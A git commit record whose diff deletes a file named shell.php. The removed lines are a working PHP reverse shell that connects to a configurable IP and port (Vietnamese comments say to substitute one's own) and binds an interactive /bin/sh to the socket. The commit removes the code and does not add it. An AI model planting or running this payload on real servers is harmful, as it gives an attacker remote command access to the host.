8b3739e20bbb2554dda7c40cedd206de11372525
Hoàng Tiến Minh <153218340+cr0nica1@users.noreply.github.com>
2025-04-16 21:33:53 +0700

    Delete shell.php

--- shell.php
+++
@@ -1,6 +0,0 @@
-<?php
-    $ip = '127.0.0.1';  // Thay YOUR_IP bằng IP của bạn
-    $port = 4444;      // Thay 4444 bằng cổng bạn muốn lắng nghe
-    $sock = fsockopen($ip, $port);
-    exec("/bin/sh -i <&3 >&3 2>&3");
-?>
